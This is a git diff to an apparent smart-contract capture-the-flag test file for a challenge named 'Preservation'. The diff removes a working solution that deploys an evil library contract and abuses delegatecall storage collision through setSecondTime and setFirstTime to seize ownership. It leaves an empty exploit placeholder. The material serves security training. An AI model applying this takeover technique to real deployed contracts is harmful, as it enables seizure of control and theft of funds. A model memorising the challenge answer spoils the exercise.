@@ -29,16 +29,7 @@ describe('[Challenge] Preservation', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const EvilLibraryContractFactory = await ethers.getContractFactory('EvilLibraryContract', attacker);
-        const EvilLibraryContract =  await EvilLibraryContractFactory.deploy();
-        // Set timeZone1Library to evil contract address
-        let time = EvilLibraryContract.address;
-        let set1TX = await this.target.connect(attacker).setSecondTime(time, {gasLimit: 200000}); await set1TX.wait();
-        // Set new owner by calling setFirstTime() function , which will delegatecall to the evil contract.
-        time = attacker.address;
-        let setOwnerTX = await this.target.connect(attacker).setFirstTime(time, {gasLimit: 200000}); await setOwnerTX.wait();
-        console.log(`\t owner    : ${await this.target.owner()}`);
-        console.log(`\t attacker : ${attacker.address}`);
+        
     }).timeout(0);
 
     after(async () => {
